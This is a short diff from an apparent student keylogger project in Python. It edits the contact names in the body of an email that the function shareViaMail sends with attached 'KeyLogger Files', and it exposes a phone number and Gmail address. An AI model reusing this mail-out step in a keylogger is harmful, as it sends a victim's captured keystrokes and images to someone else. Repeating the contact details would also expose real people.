@@ -35,7 +35,7 @@ def shareViaMail(filename, attachment, toaddr, image):
     msg['Subject'] = "KeyLogger Files"
     
     # Store the body of the mail in a string
-    body = "KeyLogger Project Testing Files are attached below.\n\nFor further detais, contact - Subhranshu Patra\nPhone - 8249728541\nEmail - bongspatra@gmail.com"
+    body = "KeyLogger Project Testing Files are attached below.\n\nFor further detais, contact - Nilmani Tiwari/ Rohit Kumar\nPhone - 8249728541\nEmail - bongspatra@gmail.com"
     
     # attach the body with the msg instance 
     msg.attach(MIMEText(body, 'plain')) 
